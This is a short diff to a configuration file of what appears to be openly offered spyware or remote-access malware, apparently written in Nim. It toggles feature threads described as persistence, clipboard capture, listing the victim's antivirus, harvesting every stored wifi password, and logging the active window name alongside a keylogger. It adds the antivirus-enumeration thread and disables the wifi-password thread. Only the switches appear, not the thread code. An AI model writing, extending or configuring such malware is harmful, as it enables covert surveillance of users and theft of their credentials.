@@ -16,10 +16,15 @@ const USE_PERSISTENCE_THREAD*: bool = false
 ## DEFAULT: true
 const USE_CLIPBOARD_THREAD*: bool = false
 
+## getAVSThread is used for getting
+## all the installed antivirus software on the user's pc
+## DEFAULT: true
+const USE_GET_AVS_THREAD*: bool = true
+
 ## wifiPasswordsThread is used for getting
 ## all the wifi passwords stored on user's pc
 ## DEFAULT: true
-const USE_WIFI_PASSWORDS_THREAD*: bool = true
+const USE_WIFI_PASSWORDS_THREAD*: bool = false
 
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
